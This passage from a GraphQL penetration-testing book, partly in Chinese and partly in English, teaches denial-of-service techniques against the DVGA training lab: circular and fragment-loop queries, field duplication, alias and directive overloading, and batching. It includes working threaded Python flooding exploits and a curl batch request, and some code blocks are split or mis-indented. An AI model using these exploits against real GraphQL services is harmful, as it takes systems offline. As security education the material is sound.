  \ {\n  pastes {\n    owner {\n      pastes {\n        owner {\n          pastes\
  \ {\n            owner {\n              name\n            }\n          }\n     \
  \   }\n      }\n    }\n  }\n}\n```\n\n\n\n\n\n这个查询执行起来很简单，但会从 GraphQL 服务器产生指数级增长的响应。查询中的循环越多，响应就越大。\n\
  \n循环关系在 GraphQL API 中很常见。在架构设计方面这并不是反模式，但除非应用程序能够优雅地处理复杂查询，否则应避免使用它们。\n\n## 如何识别循环关系\n\
  \n识别循环查询通常需要对 GraphQL 架构有深入了解。在白盒渗透测试中，我们可能可以访问 SDL 文件。在黑盒渗透测试中，我们可能会很幸运地发现应用程序的开发人员已启用了\
  \ introspection。\n\n无论哪种情况，你都应使用静态代码分析方法或将 introspection 查询的结果导入到诸如 GraphQL Voyager\
  \ 之类的架构可视化工具中，来审查架构文件是否存在对象之间的双向关系。此外，某些专门的 GraphQL 安全工具，例如 InQL，会以更动态的方式尝试发现循环关系的存在，通过发现架构并分析其类型及其关系。\n\
  \n> NOTE 在第 6 章中，我们将讨论在 introspection 已被禁用的黑盒渗透测试中获取架构信息的方法，例如通过使用专门的 GraphQL 安全工具尝试重建它。\n\
  \n## 使用 Schema Definition Language 文件\n\n让我们对示例 SDL 文件进行安全审查以识别异常。考虑本书 GitHub 仓库中的架构文件\
  \ https://github.com/dolevjf/Black-Hat-GraphQL/blob/master/ch05/sdl.graphql。该 SDL\
  \ 文件是 DVGA 的架构表示，定义了所有查询、变更和订阅，其中还包括对象类型和字段。\n\n通过复制它并将其保存为名为 sdl.graphql 的文件，将架构文件下载到你的实验机上。然后在文本编辑器中打开文件进行审查。在我们指出问题所在之前，请尝试找出导致双向对象关系的任何关系字段。\n\
  \n以下摘录显示了具有双向引用的对象：\n\n```\ntype PasteObject {\n  --snip--\n  id: ID!\n  ipAddr:\
  \ String\n```\n\n```\nburn: Boolean\n① owner: OwnerObject\n--snip--\n}\n\ntype OwnerObject\
  \ {\n  id: ID!\n  name: String\n  ② paste: [PasteObject]\n  --snip--\n}\n```\n\n\
  架构在 PasteObject 中定义了 owner 字段，其自定义类型为 OwnerObject ①。然后它定义了类型为 [PasteObject] 的 paste\
  \ 字段 ②。方括号 [PasteObject] 表示 PasteObject 类型对象的数组。可以看出，这些对象相互交叉引用，使用这些类型的客户端可能会利用它们进行\
  \ DoS 攻击。\n\n## 使用 GraphQL Voyager\n\n小型 SDL 文件很容易审查。SDL 文件越大，识别反模式并手动审计安全问题就越具挑战性。让我们可视化一个架构，这种技术可以帮助我们在审计具有更复杂架构定义的较大应用程序时提供帮助。\n\
  \n将你之前下载的 SDL 文件上传到 GraphQL Voyager（托管在 http://lab.blackhatgraphql.com:9000 或，另选\
  \ https://ivangoncharov.github.io/graphql-voyager）上，方法是单击 Change Schema 按钮并将 SDL\
  \ 文件复制到 SDL 选项卡下的框中。图 5-1 显示了 Voyager 如何说明 PasteObject 和 OwnerObject 对象之间的循环引用。\n\
  \n![](img/2f244b00cd9f8f37cfc22f928aaa471a_131_0.png)\n\n图 5-1：GraphQL Voyager 中的对象关系\n\
  \nGraphQL Voyager 突出显示自定义对象类型，例如 OwnerObject 和 PasteObject，并使用箭头指示对象关系。当你识别出此类关系时，在你执行测试以检查其抵御循环查询的能力之前，假设应用程序存在漏洞。\n\
  \n你也可以将 introspection 响应输出粘贴到 Voyager 中，以生成架构的相同可视化表示，就像我们在前几章中所做的那样。\n\n## 使用 InQL\n\
  \n识别循环查询的另一种方法是使用 InQL 安全审计工具。我们在第 2 章的实验中安装了 InQL。InQL 的主要功能之一是能够自动检测循环关系。InQL\
  \ 可以通过命令行读取 introspection 查询生成的 JSON 文件。或者，如果它支持 Introspection，它可以直接向目标 GraphQL\
  \ 服务器发送 introspection 查询。\n\n让我们使用 Altair 运行一个 introspection 查询。我们将响应保存到文件系统上的 JSON\
  \ 文件中，以便 InQL 可以读取它、解析它并遍历架构以查找循环关系。\n\n在你的实验机上，打开 Altair 并将地址栏中的 URL 设置为 http://localhost:5013/graphql。复制位于\
  \ https://github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt\
  \ 的 introspection 查询并将其粘贴到 Altair 中（图 5-2）。然后单击 Send Request 将查询发送到 DVGA。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_132_0.png)\n\
  \n一旦返回成功的响应，通过单击 Altair 右下角的 Download 按钮以 JSON 格式下载响应。将文件保存为 /home/kali 下的 introspection_query.json。\n\
  \n接下来，打开终端。要执行循环查询检查，我们将向 InQL 传递三个标志：-f 标志，用于使用我们下载的 JSON 文件；--generate-cycles\
  \ 标志，用于执行循环查询检测检查；以及 -o 标志，用于将输出写入专用文件夹。以下命令将这些标志组合起来执行循环查询检测：\n\n```\n# inql -f\
  \ /home/kali/introspection_query.json --generate-cycles -o dvga_cycles\n[!] Parsing\
  \ local schema file\n[+] Writing Introspection Schema JSON\n[+] Writing query Templates\n\
  Writing systemUpdate query\nWriting pastes query\n[+] Writing mutation Templates\n\
  Writing createPaste mutation\n[+] Writing Query Cycles to introspection_query\n\
  [+] DONE\n```\n\n检查完成后，你会注意到 InQL 创建了一个 dvga_cycles 文件夹。在此文件夹中，查找以单词 cycles 开头的文本文件；该文件将包含脚本执行的结果。你可以运行此命令来查看检查结果：\n\
  \n```\n# cat dvga_cycles/introspection_query/cycles*\n\nCycles(\n    { OwnerObject\
  \ -[paste]-> PasteObject -[owner]-> OwnerObject }\n    { OwnerObject -[pastes]->\
  \ PasteObject -[owner]-> OwnerObject }\n)\n```\n\nInQL 能够找到架构中 PasteObject 和 OwnerObject\
  \ 节点之间存在循环关系的路径。在内部，InQL 使用两种主要图算法遍历 JSON 文件：\n\n- Tarjan 算法，以其发明者 Robert Tarjan\
  \ 命名，用于在节点由边连接且每条边都有方向关联的图中查找循环关系。\n- Johnson 算法，以其发明者 Donald B. Johnson 命名，用于查找图中每对节点之间的最短路径。\n\
  \nInQL 还可以通过直接连接到 GraphQL API 并获取 introspection 信息来运行相同的检查。为此，使用 -t 标志指定目标：\n\n\
  ```\n# inql -t http://localhost:5013/graphql --generate-cycles -o dvga_cycles\n\
  [+] Writing Introspection Schema JSON\n[+] DONE\nWriting pastes query\n[+] Writing\
  \ mutation Templates\nWriting importPaste mutation\n[+] DONE\n[+] Writing Query\
  \ Cycles to localhost:5013\n```\n\n-t 选项使我们能够在有要测试的主机列表时扩展此检查。列表 5-2 显示了如何将主机添加到名为\
  \ hosts.txt 的文件中。\n\n```\n# cd ~\n# echo 'http://localhost:5013/graphql' > hosts.txt\n\
  # cat hosts.txt\nhttp://localhost:5013/graphql\n```\n\n列表 5-2：包含目标 GraphQL 服务器的文件\n\
  \n列表 5-3 显示了如何编写 Bash 循环，通过读取 hosts.txt 文件来测试多个主机。\n\n```\nfor host in $(cat hosts.txt);\
  \ do\n    inql -t \"$host\" --generate-cycles\ndone\n```\n\n列表 5-3：遍历目标主机并对每个主机运行\
  \ InQL 的 Bash for 循环\n\nfor 循环将逐行读取 hosts.txt 文件并将每一行分配给 host 变量。然后 InQL 将使用此变量作为其目标。这种技术使我们能够以自动化方式测试数十个\
  \ URL。\n\n如果你尝试对大型应用程序运行 InQL，请考虑使用 --cycles-timeout 标志为循环检查设置超时。这将确保在目标架构规模较大时，应用程序在查找循环查询时不会挂起。\n\
  \n## 循环查询漏洞\n\n现在你已经知道如何使用多种工具识别循环查询，让我们看看发送循环查询会对 DVGA 应用程序产生什么影响。我们将制作一个特殊的 GraphQL\
  \ 查询，利用我们发现的循环关系执行深度递归请求。\n\n成功的循环查询将导致服务器负载过重并可能使其崩溃。因此，测试循环查询可能存在风险。为了安全起见，我们将提供循环查询的安全版本和不安全版本。安全版本比不安全版本的循环性更少，因此你可以在实验环境中安全地尝试，而不会导致目标崩溃。\n\
  \n打开 Altair 并复制 safe-circular-query.graphql 文件的内容，文件位于 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/safe-circular-query.graphql。列表\
  \ 5-4 显示了此查询。\n\n```\nquery {\n  pastes {\n    owner {\n      pastes {\n       \
  \ owner {\n          name\n        }\n      }\n    }\n  }\n}\n```\n\n列表 5-4：GraphQL\
  \ 中的递归查询\n\n\n\n\n\n正如名称所示，safe-circular-query.graphql 是循环查询的安全版本。在此查询中，我们请求应用程序中所有粘贴内容的拥有者姓名，只是我们以循环的方式进行，这会指数级增加\
  \ GraphQL 服务器需要加载的对象数量。将查询粘贴到 Altair 中并在服务器上运行，以证明循环查询的概念。\n\n> 注意 如果你感觉大胆并且好奇更复杂的循环查询会对我们的脆弱目标产生什么影响，你可以在\
  \ https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/unsafe-circular-query.graphql\
  \ 找到该查询的不安全版本。此查询可能会导致 DVGA 实例崩溃，甚至可能导致 hypervisor 崩溃，因此请谨慎使用。\n\n## 循环内省漏洞\n\n\
  GraphQL 内置的内省系统存在循环关系。因此，当启用内省时，你可能可以直接获得循环查询。\n\n内省系统有自己的模式，定义在官方 GraphQL 规范文档中。以下是其摘录：\n\
  \n```\ntype __Schema {\n  --snip--\n  types: ① [__Type!]!\n  queryType: __Type!\n\
  \  mutationType: __Type\n  subscriptionType: __Type\n  directives: [__Directive!]!\n\
  \  --snip--\n}\n```\n\n```\ntype ② __Type {\n  --snip--\n  name: String\n  description:\
  \ String\n  fields(includeDeprecated: Boolean = false): ③ [__Field!]\n  --snip--\n\
  }\n```\n\n```\ntype ④ __Field {\n  --snip--\n  name: String!\n  description: String\n\
  \  args: [__InputValue!]!\n  type: ⑤ __Type!\n  isDeprecated: Boolean!\n  --snip--\n\
  }\n```\n\n在 ① 处，`types` 字段为 `__Schema` 对象类型定义。你可以看到 `types` 被设置为 `[__Type!]`，这意味着它使用在\
  \ ② 处定义的 `__Type` 对象。方括号和感叹号意味着 `types` 字段将返回一个不可为空的 `__Type` 对象数组。\n\n`__Type`\
  \ 对象有一个在 ③ 处设置的 `fields` 字段，类型为 `[__Field!]`。这将返回一个包含 `__Field` 对象的不可为空数组。在 ④ 处，`__Field`\
  \ 类型被定义。此类型有一个名为 `type` 的字段，在 ⑤ 处引用 `__Type` 对象。正如你所见，`__Type.fields` 与 `__Field.type`\
  \ 之间存在循环关系。\n\n> 注意\n> 完整的内省系统模式可以在 GraphQL 规范文档中的 https://spec.graphql.org/October2021/#sec-Schema-Introspection.Schema-Introspection-Schema\
  \ 找到。\n\n你可以通过使用 Altair 运行以下查询轻松测试这种循环关系：\n\n```\nquery {\n  __schema {\n    types\
  \ {\n      fields {\n        type {\n          fields {\n            type {\n  \
  \            fields {\n                name\n              }\n            }\n  \
  \        }\n        }\n      }\n    }\n  }\n}\n```\n\n此类循环查询可以相当容易地被利用。虽然单个查询可能无法使服务器瘫痪，但一系列复杂查询可能会对其产生影响。\n\
  \n## 循环片段漏洞\n\nGraphQL 操作可以通过使用片段来共享逻辑，如第 3 章所述。片段由客户端定义，因此客户端可以将其中的任何逻辑构建到其中。也就是说，GraphQL\
  \ 规范文档包含有关片段应如何实现的规则，包括以下一条：\n\n> 片段展开的图必须不形成任何循环，包括自身展开。否则，操作可能会无限展开或在底层数据的循环上无限执行。\n\
  \n让我们探索片段如何构建成循环并导致 DoS。在 DVGA 中运行以下查询，该查询在对象 PasteObject 上使用名为 Start 的片段。`pastes`\
  \ 字段使用 `...Start` 语法利用此片段：\n\n```\nquery {\n  pastes {\n    ...Start\n  }\n}\n\n\
  fragment Start on PasteObject {\n  title\n  content\n}\n```\n\n执行查询时，它会返回 `pastes`\
  \ 的字段和内容字段：\n\n```\n\"pastes\": [\n  {\n    \"title\": \"My Title\",\n    \"content\"\
  : \"My First Paste\"\n  }\n]\n```\n\n现在，如果我们添加另一个名为 End 的片段，该片段使用 Start 片段，并修改 Start\
  \ 片段以使用 End 片段，会发生什么？这里会出现一个有趣的情况：\n\n```\nquery CircularFragment {\n  pastes {\n\
  \    ...Start\n  }\n}\n\nfragment Start on PasteObject {\n  title\n  content\n \
  \ ...End\n}\n\nfragment End on PasteObject {\n  ...Start\n}\n```\n\n此条件会导致无限执行，正如\
  \ GraphQL 规范所建议的那样。在实验室中尝试使用此查询进行实验。\n\n注意 执行此查询将立即导致 DVGA 因段错误而崩溃。请确保仅在虚拟实验室中执行它。运行查询后，DVGA\
  \ 将不再可用。要重新启动它，只需按照第 2 章的步骤创建另一个 Docker 容器即可。\n\n如果你运行了查询，你应该会看到几乎立即崩溃！你可能会想，所有\
  \ GraphQL 服务器都容易受到此攻击吗？简短的答案是否定的，如果 GraphQL 服务器符合规范。GraphQL 服务器应该在执行前拒绝此类查询。尽管如此，你永远不知道在渗透测试中可能会遇到完全定制的实现，因此了解此技术是值得的。\n\
  \n## 字段重复\n\n字段重复漏洞涉及包含重复字段的查询。它们执行起来很简单，但效果不如循环查询。\n\n虽然循环查询是小型查询，但会导致异常大的响应，而字段重复是大型查询，会因为处理和解析所需的时间而耗尽服务器。为了有效地通过字段重复滥用\
  \ GraphQL API，你必须发送持续的查询流，以使服务器资源持续忙碌。\n\n## 理解字段重复的工作原理\n\n要了解字段重复的工作原理，请考虑以下 GraphQL\
  \ 查询：\n\n```\nquery {\n  pastes {\n    title\n    content\n  }\n}\n```\n\n此查询返回应用程序中所有粘贴的\
  \ `title` 和 `content` 字段。当 GraphQL 收到此查询时，它将使用其查询解析器提供每个请求的字段。\n\n如果我们在查询中“填充”额外的字段，GraphQL\
  \ 将被迫分别解析每个字段。这种行为可能会给服务器带来额外负载，导致性能下降，甚至完全崩溃。\n\n这里的策略相当简单：选择一个你认为解析可能很昂贵的字段，并用该字段名称的额外副本填充查询。清单\
  \ 5-5 显示了一个示例查询。\n\n```\nquery {\n  pastes {\n    title\n    content\n    content\n\
  \    content\n    content\n    content\n  }\n}\n```\n\n清单 5-5：包含重复字段的 GraphQL 查询\n\
  \n当查询包含多个重复字段时，例如清单 5-5 中 `content` 重复五次，你可能会期望在响应中看到相同的五个字段。实际上，GraphQL 将合并响应并仅显示单个\
  \ `content` JSON 字段：\n\n```\n{\n  \"data\": {\n    \"pastes\": [\n      {\n    \
  \    \"title\": \"My Title\",\n        \"content\": \"My First Paste\"\n      }\n\
  \    ]\n  }\n}\n```\n\n从客户端角度来看，似乎 GraphQL 忽略了我们的重复字段。幸运的是，情况并非如此。通过响应时间分析，你可以看到查询对服务器的影响。除非服务器已实施特定的安全防御，例如查询成本分析（本章后面会介绍），否则你应该期望在大多数\
  \ GraphQL 实现中看到这些漏洞。\n\n## 测试字段重复漏洞\n\n为了在我们的实验室中测试字段重复攻击，我们将编写一个简单的查询并尝试重复几个选定的字段，看看我们的目标如何响应。\n\
  \n打开 Altair 并确保地址栏设置为 http://localhost:5013/graphql。在左侧窗格中输入以下查询，它将作为基线：\n\n```\n\
  query {\n  pastes {\n    content\n  }\n}\n```\n\n点击发送以查询 GraphQL。在响应部分，你会注意到 Altair\
  \ 提供了服务器响应的总时间，单位为毫秒，如图 5-3 所示。\n\nDVGA 响应查询花费了 26 毫秒，这是一个正常的响应时间。你在实验室中看到的时间可能会有所不同，但应该在同一范围内。\n\
  \n\n\n\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_140_0.png)\n\nFigure 5-3: The\
  \ Altair response time indicator\n\nNext, copy the query from https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/field-duplication.graphql,\
  \ paste it into Altair, and run it. This query contains approximately 1,000 content\
  \ fields. Figure 5-4 shows that processing this query took 958 milliseconds, which\
  \ is 36 times slower!\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_140_1.png)\n\n\
  Figure 5-4: A slower response time to a query with repeating fields\n\nSome fields\
  \ will require more resources to resolve, so the performance impact might vary depending\
  \ on the chosen field.\n\nThis attack requires the client to continuously send large\
  \ payloads. Attempting to manually exploit field duplication can be cumbersome.\
  \ As an alternative method, you can use a special Python exploit that attempts to\
  \ perform a field duplication attack at a far larger scale. Listing 5-6 shows a\
  \ snippet of such an exploit. It sends a continuous stream of queries to a remote\
  \ server in order to exhaust its resources.\n\n```\nTHREADS = 50\n\n① payload =\
  \ 'content \\n title \\n' * 1000\n② query = {'query':'query { \\n ' + payload +\
  \ '}'} \n\n③ def DoS():\n    try:\n        r = requests.post(GRAPHQL_URL, json=query)\n\
  \        print('Time took: {} seconds '.format(r.elapsed.total_seconds()))\n   \
  \     print('Response:', r.json())\n    except Exception as e:\n        print('Error',\
  \ e.message)\n\n④ while True:\n    print('Running...')\n    time.sleep(2)\n    for\
  \ _ in range(THREADS):\n        t = threading.Thread(target=DoS, args=())\n    \
  \    t.start()\n```\n\nListing 5-6: A field duplication exploit\n\nThis code creates\
  \ a dynamic payload variable ① with two duplicated fields: content and title. Each\
  \ is repeated 1,000 times. At ② it concatenates the payload with the query JSON\
  \ variable. It then defines a function named DoS that is responsible for sending\
  \ the HTTP POST request containing our malicious GraphQL query ③. We run an infinite\
  \ while loop that executes the DoS function using 50 threads every two seconds ④.\
  \ The full exploit code can be found on GitHub at https://github.com/dolevjf/Black-Hat-GraphQL/blob/master/ch05/exploit_threaded_field_dup.py\n\
  \nYou can download this exploit and run it against DVGA with the following command.\
  \ Keep in mind that performance could degrade on your machine while it is running:\n\
  \n```\n# python3 exploit_threaded_field_dup.py http://localhost:5013/graphql\n```\n\
  \nSince the exploit uses an infinite loop, it won’t stop its operations on its own;\
  \ you can halt it by pressing CTRL-C to send the SIGINT signal.\n\n## Alias Overloading\n\
  \nIn Chapter 3, you learned how to use aliases to rename duplicate fields so that\
  \ the GraphQL server treats them as two different queries. The ability to run multiple\
  \ queries in a single HTTP request is quite powerful. Security analysts could easily\
  \ overlook these single requests when hunting for suspicious traffic (as could WAFs).\
  \ After all, they might think, what harm can a single HTTP request possibly cause?\n\
  \nBy default, GraphQL servers won’t limit the number of aliases that can be used\
  \ in a single request. The GraphQL application maintainer could implement custom\
  \ protections, such as counting the aliases and restricting them in some middleware,\
  \ but since aliases are part of the specification, it’s uncommon to remove support\
  \ for them or limit their functionality.\n\n### Abusing Aliases for Denial of Service\n\
  \nWhen performing a penetration test, you may run into queries that seem to take\
  \ the server longer to process than others. If you identify such a query, you can\
  \ hog system resources by calling the same query over and over again. If the server\
  \ struggles to quickly return a response, flooding the server with the same query\
  \ could result in system overload.\n\nIn DVGA, one specific query is slower than\
  \ others: systemUpdate. This query is designed to simulate long-running commands,\
  \ such as those that perform system updates. Unauthorized clients should never be\
  \ allowed to perform queries that change system state, but nothing is impossible\
  \ in real-life penetration testing scenarios! Let’s run the systemUpdate query in\
  \ Altair to see how long this command takes to fully process. It takes no arguments,\
  \ as shown here:\n\n```\nquery {\n  systemUpdate\n}\n```\n\nSend this query to the\
  \ server and observe the time it takes for the server to return a response (Figure\
  \ 5-5).\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_142_0.png)\n\nFigure 5-5: The\
  \ systemUpdate query response time\n\nThe systemUpdate took 50,361 milliseconds\
  \ to complete. That’s around 50 seconds, a significant amount of time by today’s\
  \ web standards. This is an example of a query that we might be able to leverage\
  \ for DoS purposes.\n\n> NOTE\n> In your lab, the response time to systemUpdate\
  \ could be faster. DVGA randomizes its behavior when this query is used to simulate\
  \ system load behavior.\n\nUsing GraphQL aliases, we can attempt to run systemUpdate\
  \ a few times to see how the server behaves. Listing 5-7 shows how you can run systemUpdate\
  \ more than once, using aliases.\n\n```\nquery {\n  one:systemUpdate\n  two:systemUpdate\n\
  \  three:systemUpdate\n  four:systemUpdate\n  five:systemUpdate\n}\n```\n\nListing\
  \ 5-7: Aliasing the systemUpdate query\n\nRunning this query in Altair should take\
  \ longer than normal to complete.\n\nIf you need to generate hundreds of queries,\
  \ you can use a short Python script in the terminal to craft a query programmatically,\
  \ as shown in Listing 5-8.\n\n```\n# python3 -c 'for i in range(0, 10): print(\"\
  q\"+str(i)+\":\"+\"systemUpdate\")'\nq0:systemUpdate\nq1:systemUpdate\nq2:systemUpdate\n\
  ```\n\nListing 5-8: Generating aliases with Python\n\nRemember: there are no limits\
  \ to the number of aliases a client can provide by default, unless the application\
  \ maintainer has implemented specific protections against these types of attacks\
  \ or the web server has set HTTP body length limits. That means we could specify\
  \ dozens of aliases and hog server resources in a single HTTP request.\n\nOther\
  \ interesting, non-DoS use cases exist for aliases when it comes to penetration\
  \ testing, such as defeating authentication mechanisms. You'll learn more about\
  \ those in Chapter 7.\n\n### Chaining Aliases and Circular Queries\n\nSince aliases\
  \ are part of the GraphQL specification, any other vulnerability you identify can\
  \ be combined with aliases. The query in Listing 5-9 shows how we can run a circular\
  \ query with an alias.\n\n```\nquery {\n  q1:pastes {\n    owner {\n      pastes\
  \ {\n        owner {\n          name\n        }\n      }\n    }\n  }\n  q2:pastes\
  \ {\n    owner {\n      pastes {\n        owner {\n```\n\n```\nname\n    }\n   \
  \ }\n    }\n}\n```\n\nListing 5-9: Circular queries with aliases\n\nThis query is\
  \ not recursive enough to cause any harm to a GraphQL server, but it illustrates\
  \ the possibility of making more than one circular query in a single GraphQL document.\n\
  \nThe disadvantage of aliases is that they allow aliasing only queries of the same\
  \ root type. You can alias queries only with queries, or mutations only with mutations,\
  \ but not queries and mutations together.\n\n## Directive Overloading\n\nChapter\
  \ 3 covered GraphQL directives, which are a way to decorate a field or object in\
  \ GraphQL by using the at (@) symbol. While directives are part of the GraphQL specification,\
  \ the specification does not discuss security controls that should be implemented\
  \ for directives. In general, GraphQL implementations check whether the client repeats\
  \ a query directive; if so, the server rejects the query. Typical checks on directives\
  \ are the following:\n\n- UniqueDirectivesPerLocation ensures that unique directives\
  \ are in each document location, such as a field.\n- UniqueDirectiveNames ensures\
  \ that directives have unique names if more than one is supplied in a location such\
  \ as a field.\n\nHowever, nonexistent queries can be supplied many times. There\
  \ are effectively no limits to the number of nonexistent directives a client can\
  \ supply in most of the popular GraphQL implementations today.\n\nOur research has\
  \ shown that it's possible to exhaust GraphQL servers' query parsers by passing\
  \ a large number of nonexistent directives in a single query. During our responsible\
  \ disclosure process for this directive overloading vulnerability, we engaged with\
  \ multiple GraphQL developers on the matter. Opinions on whether it's the maintainers'\
  \ or consumers' responsibility to address the flaw varied quite a bit. Companies\
  \ that were part of the disclosure process and chose to address it did so by limiting\
  \ the number of directives a server will accept or blocking the query based on its\
  \ HTTP request body's size.\n\n### Abusing Directives for Denial of Service\n\n\
  The directive overloading vulnerability is somewhat similar to field duplication\
  \ in that it requires us to send many directives via several continuous requests.\
  \ Despite requiring more computing power than a vulnerability like circular queries,\
  \ we've found it to be effective at degrading the server's performance.\n\n\n\n\n\
  \n攻击相当简单：在查询的多个部分中填充指令并将其发送到服务器，如清单 5-10 所示。\n\n```\nquery {\n  pastes {\n    title\
  \ @aa@aa@aa # add as many directives as possible\n    content @aa@aa@aa@aa\n  }\n\
  }\n```\n\n清单 5-10：指令过载的示例\n\n对服务器的影响可能因其硬件规格而异。我们在使用这种利用技术时观察到不同的服务器行为，例如 GraphQL\
  \ 服务器崩溃（由于数据库内存错误）或服务性能下降。\n\n## 测试指令过载\n\n本书 GitHub 仓库中的利用程序 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/exploit_directive_overloading.py\
  \ 利用了这种类型的漏洞，可以针对 DVGA 执行指令过载攻击。\n\n在运行此脚本的任何时候，都可以通过按 CTRL-C 发送 SIGINT 信号来停止其操作。请注意，在脚本运行期间，DVGA\
  \ 很可能会变慢或无响应。\n\n以下命令从命令行运行利用程序：\n\n```\n# python3 exploit_directive_overloading.py\
  \ http://localhost:5013/graphql 30000\n```\n\n清单 5-11 显示了主要的利用代码。\n\n```\nURL =\
  \ sys.argv[1]\nFORCE_MULTIPLIER = int(sys.argv[2])\n\ndef start_attack():\n    payload\
  \ = '@dos' * FORCE_MULTIPLIER\n    query = {'query': 'query { __typename ' + payload\
  \ + ' }'}\n    try:\n        r = requests.post(URL, json=query, verify=False)\n\
  \        print('\\t HTTP Response', r.text)\n        print('\\t HTTP Code: ', str(r.status_code))\n\
  \    except:\n        pass\n\nthreads = []\n\nwhile True:\n    time.sleep(2)\n \
  \   start = time.time()\n    start_attack()\n    print(f'\\tTime request took: {time.time()\
  \ - start}')\n\nfor i in range(300):\n```\n\n```\nt = threading.Thread(target=start_attack)\n\
  threads.append(t)\nt.start()\n\nfor t in threads:\n    t.join()\n```\n\n清单 5-11：滥用指令过载漏洞的利用代码\n\
  \n利用程序从命令行接受两个参数，一个用于标识目标 API，另一个用于在利用期间填充到查询中的指令数量。作为 `start_attack` 函数的一部分，我们将\
  \ `dos` 指令乘以提供的指令数量。然后我们构建将使用恶意负载的 GraphQL 查询并创建 300 个线程，每个线程并行运行 `start_attack`\
  \ 函数。这通过使用无限 `while` 循环使服务器资源在利用运行期间保持繁忙。\n\nNOTE 利用程序中指定的指令不必存在于 GraphQL 中才能工作。你可以指定任意文本并在其前面加上\
  \ @ 符号。\n\n## 对象限制覆盖\n\nGraphQL 服务器默认可以实现对返回给客户端的数据量的限制。对于返回数组的字段来说尤其重要。例如，回顾一下，在\
  \ DVGA 中，`pastes` 查询返回一个粘贴对象数组：\n\n```\ntype Query {\n  pastes: [PasteObject]!\n\
  }\n```\n\n感叹号意味着 `pastes` 是非空的，因此数组必须有零个或多个项目。除非查询被明确限制，否则 GraphQL 将返回所有对象作为对 `pastes`\
  \ 请求的响应。例如，如果数据库有 10,000 个对象，GraphQL 可能会返回全部 10,000 个。\n\n包含 10,000 个对象的响应对于服务器（和客户端）来说是大量数据。服务器可以实现逻辑将返回对象的数量限制为更受限制的数量，例如\
  \ 100。例如，它们可能会按创建时间对对象进行排序并仅返回最新的粘贴。这种过滤可以在数据库级别、GraphQL 级别或两者同时进行。\n\n一些 GraphQL\
  \ 应用程序可能允许客户端通过传递诸如 `limit` 之类的特殊参数来覆盖此服务器端对象限制，如此示例所示。继续在 Altair 中运行此查询：\n\n```\n\
  query {\n  pastes(limit:100000, public: true) {\n    content\n  }\n}\n```\n\n执行此查询时，GraphQL\
  \ 可能在幕后将其转换为 SQL 查询，如下所示：\n\n```\nSELECT content FROM pastes WHERE public = true\
  \ LIMIT 100000\n```\n\n在 DVGA 这样的小型数据库上，这不会造成多大危害。然而，在非常大的数据库上，控制服务器返回的行数可能非常强大，并且可能允许我们执行数据库级别的\
  \ DoS。\n\n如果启用了 introspection，GraphQL 将在你输入时自动补全参数，使得发现查询支持的参数变得很容易。如果禁用了 introspection，请尝试常见的关键字，例如\
  \ `limit`、`offset`、`first`、`after`、`last`、`max` 和 `total`。这些关键字通常与 API 分页相关联，分页是一种控制\
  \ HTTP 响应中返回的数据量的方式。分页将大型数据集分成较小的部分，这允许客户端以块的形式请求和接收数据。\n\n值得测试服务器允许客户端请求多少个对象。能够从服务器请求任意数量的记录的能力可能成为应用程序中的另一个\
  \ DoS 向量。\n\n## 基于数组的查询批处理\n\n现在我们将探索一个非常方便地允许我们扩展到目前为止所学攻击的功能。查询批处理是用于将多个查询分组并并行发送到\
  \ GraphQL API 的任何方法。别名是查询批处理的一种形式。\n\n虽然有用，但别名有一个明显的缺点，即它们只能批处理相同操作根类型的查询。例如，你不能将\
  \ mutation 和 query 一起别名。数组批处理技术允许我们混合查询和 mutation。然而，数组不是规范的一部分，因此在所有渗透测试中可能都不可用。\n\
  \n### 了解基于数组的查询批处理的工作原理\n\n基于数组的查询批处理是一种功能，允许客户端在 JSON 负载的一部分中以数组的形式发送多个任何根类型的 GraphQL\
  \ 查询。假设我们想要多次发送一个查询并多次接收相同的响应。使用基于数组的查询批处理，我们可以通过本质上复制此查询并将副本添加为数组的元素来轻松实现。以下是伪查询示例：\n\
  \n```\n[ query { ipAddr title content } query { ipAddr title\n```\n\n```\ncontent\n\
  }\n]\n```\n\n当 GraphQL 从客户端接收到查询数组时，它将按顺序处理它们，并在最后一个数组元素被处理和解析之前不返回响应。一旦所有查询都被解析，它将返回一个包含所有查询响应的数组作为单个\
  \ HTTP 响应。\n\n你的黑客直觉可能在此时开始发挥作用，因为这里存在明显的风险。假设客户端将发送合理数量的查询到数组中。但如果客户端在单个数组中发送数千个查询会怎样？让我们来看看。剧透：会发生坏事。\n\
  \n与别名一样，识别基于数组的批处理查询的滥用可能很困难，因为安全分析师在日志中看到的只是一个 HTTP 请求。这可能不会立即显现为恶意模式。因此，这种技术可能会绕过传统的速率限制控制，这些控制可能限制客户端每秒请求数（RPS）或每分钟请求数（RPM）。\n\
  \n在本章末尾，我们将讨论应用程序可以实施的一些潜在缓解措施来处理批处理查询。\n\n### 测试基于数组的查询批处理\n\nGraphQL IDEs 如 Altair、GraphQL\
  \ Playground 和 GraphiQL Explorer 不直接从界面支持基于数组的查询。因此，为了测试 DVGA 是否启用了基于数组的查询批处理，我们需要使用\
  \ HTTP 客户端，如 cURL 或脚本语言，如 Python。我们将在实验室中展示如何使用这两种方法。\n\n### 使用 cURL\n\n清单 5-12\
  \ 中的命令使用 cURL 发送查询数组。\n\n```\n# curl http://localhost:5013/graphql -H \"Content-Type:\
  \ application/json\" -d '[{\"query\":\"query {systemHealth}\"},{\"query\":\"query\
  \ {systemHealth}\"}]'\n[\n  {\"data\":{\"systemHealth\":\"System Load: 0.03 \\n\"\
  }},\n  {\"data\":{\"systemHealth\":\"System Load: 0.03 \\n\"}}\n]\n```\n\n清单 5-12：使用\
  \ cURL 的基于数组的批处理查询\n\n在此 cURL 命令中，我们使用 `-d` 标志将 GraphQL 查询数组发送到服务器。数组由方括号 [] 定义，围绕两个相似的\
  \ GraphQL 查询。在每个查询中，我们使用 `systemHealth` 对象。GraphQL 服务器返回两个单独的响应。\n\n如果 GraphQL 服务器支持发送包含两个\
  \ GraphQL 查询的数组将导致相等数量的查询响应\n\n\n\n基于数组的查询批处理。可以通过我们在响应中收到的 data JSON 字段判断出这种情况。当使用\
